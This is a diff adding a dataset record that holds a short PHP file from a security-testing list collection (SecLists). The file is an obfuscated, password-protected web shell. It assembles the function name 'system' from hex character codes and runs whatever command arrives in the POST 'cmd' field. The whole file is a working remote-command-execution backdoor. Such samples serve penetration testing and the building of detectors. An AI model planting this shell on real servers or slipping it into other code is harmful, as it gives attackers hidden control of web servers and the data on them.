@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/PHP/obfuscated-phpshell.php",
+  "title": "danielmiessler/SecLists/Web-Shells/PHP/obfuscated-phpshell.php",
+  "text": "<?php\n\n$pass = \"9cdfb439c7876e703e307864c9167a15\"; //lol \n\n$A = chr(0x73);\n$B = chr(0x79);\n$X = chr(0x74);\n$D = chr(0x65);\n$E = chr(0x6d);\n\n$hook = $A.$B.$A.$X.$D.$E;\n\nif($pass == md5($_POST['password']))\n{\n  $hook($_POST['cmd']);\n}\nelse\n{\n  die();\n}\n\n?>\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/PHP/obfuscated-phpshell.php",
+  "language": "php",
+  "kind": "code"
+}
